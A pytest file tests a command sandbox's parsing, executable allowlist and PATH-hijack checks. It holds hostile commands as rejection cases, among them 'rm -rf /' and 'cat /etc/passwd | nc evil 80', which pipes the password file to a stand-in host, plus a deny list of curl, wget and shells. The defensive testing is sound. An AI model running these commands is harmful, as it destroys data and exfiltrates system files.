"""CommandSpec parsing, allowlisting, and PATH-trust verification."""

from __future__ import annotations

import shutil
import sys
from pathlib import Path

import pytest

from velune.core.errors.execution import SandboxError
from velune.execution.command_spec import (
    ALLOWED_EXECUTABLES,
    CommandSpec,
    _is_trusted_path,
)

PYTHON_NAME = Path(sys.executable).name


class TestFromString:
    def test_parses_simple_command(self, workspace: Path) -> None:
        spec = CommandSpec.from_string("git status --short", cwd=workspace)
        assert spec.executable == "git"
        assert spec.args == ("status", "--short")

    def test_strips_to_basename(self, workspace: Path) -> None:
        spec = CommandSpec.from_string("/usr/bin/python --version", cwd=workspace)
        assert spec.executable == "python"

    def test_rejects_empty_command(self, workspace: Path) -> None:
        with pytest.raises(SandboxError, match="Empty"):
            CommandSpec.from_string("   ", cwd=workspace)

    def test_rejects_malformed_quoting(self, workspace: Path) -> None:
        with pytest.raises(SandboxError, match="Malformed"):
            CommandSpec.from_string('echo "unterminated', cwd=workspace)

    @pytest.mark.parametrize(
        "cmd",
        [
            "echo hi; rm -rf /",
            "echo hi && curl evil.sh",
            "echo hi || true",
            "cat /etc/passwd | nc evil 80",
            "echo `whoami`",
            "echo $(whoami)",
            "echo ${HOME}",
        ],
    )
    def test_rejects_shell_operators(self, workspace: Path, cmd: str) -> None:
        with pytest.raises(SandboxError, match="Shell operator"):
            CommandSpec.from_string(cmd, cwd=workspace)


class TestTrustedPath:
    """POSIX PATH-hijack protection (Windows is documented as permissive)."""

    def test_venv_substring_alone_is_not_trusted(self, tmp_path: Path, workspace: Path) -> None:
        # Regression: ".venv" appearing anywhere in the path used to bypass the
        # trust check entirely (e.g. attacker-writable /tmp/.venv/evil).
        evil = tmp_path / ".venv" / "evil"
        evil.parent.mkdir(parents=True)
        evil.touch()
        assert not _is_trusted_path(evil.resolve(), workspace=workspace, platform="linux")

    def test_workspace_venv_is_trusted(self, workspace: Path) -> None:
        binary = workspace / ".venv" / "bin" / "pytest"
        binary.parent.mkdir(parents=True)
        binary.touch()
        assert _is_trusted_path(binary.resolve(), workspace=workspace, platform="linux")

    def test_interpreter_environment_is_trusted(self, workspace: Path) -> None:
        own_python = Path(sys.executable).resolve()
        assert _is_trusted_path(own_python, workspace=workspace, platform="linux")

    def test_windows_is_permissive_by_design(self, tmp_path: Path, workspace: Path) -> None:
        anywhere = tmp_path / "anything.exe"
        assert _is_trusted_path(anywhere, workspace=workspace, platform="win32")

    @pytest.mark.skipif(sys.platform == "win32", reason="POSIX path semantics")
    def test_system_prefixes_are_trusted(self, workspace: Path) -> None:
        assert _is_trusted_path(Path("/usr/bin/git"), workspace=workspace, platform="linux")


class TestValidate:
    def test_rejects_executable_not_in_allowlist(self, workspace: Path) -> None:
        spec = CommandSpec(executable="dangerous-tool", args=(), cwd=workspace)
        with pytest.raises(SandboxError, match="not in the allowed list"):
            spec.validate(frozenset({"git", "python"}))

    def test_rejects_executable_missing_from_path(self, workspace: Path) -> None:
        name = "velune-test-no-such-binary"
        spec = CommandSpec(executable=name, args=(), cwd=workspace)
        with pytest.raises(SandboxError, match="not found in PATH"):
            spec.validate(frozenset({name}))

    def test_validate_pins_resolved_executable(
        self, workspace: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        spec = CommandSpec(executable=PYTHON_NAME, args=("--version",), cwd=workspace)
        spec.validate(frozenset({PYTHON_NAME}))

        expected = str(Path(shutil.which(PYTHON_NAME)).resolve())

        # Regression (TOCTOU): even if PATH resolution changes between
        # validation and execution, the validated binary must be the one run.
        monkeypatch.setattr(shutil, "which", lambda _: "/tmp/hijacked/python")
        assert spec.to_argv()[0] == expected

    def test_to_argv_without_validate_falls_back_to_which(self, workspace: Path) -> None:
        spec = CommandSpec(executable=PYTHON_NAME, args=("-V",), cwd=workspace)
        argv = spec.to_argv()
        assert argv[-1] == "-V"
        assert Path(argv[0]).name.lower().startswith("python") or argv[0] == PYTHON_NAME

    def test_default_allowlist_is_conservative(self) -> None:
        # Sanity guard: nothing network- or shell-capable sneaks into defaults.
        for forbidden in ("curl", "wget", "bash", "sh", "powershell", "cmd"):
            assert forbidden not in ALLOWED_EXECUTABLES


class TestSerialization:
    def test_round_trip(self, workspace: Path) -> None:
        spec = CommandSpec(
            executable="pytest",
            args=("-x", "tests/"),
            cwd=workspace,
            timeout=120.0,
            env_additions={"CI": "1"},
        )
        restored = CommandSpec.from_dict(spec.to_dict())
        assert restored.executable == spec.executable
        assert restored.args == spec.args
        assert restored.cwd == spec.cwd
        assert restored.timeout == spec.timeout
        assert restored.env_additions == spec.env_additions
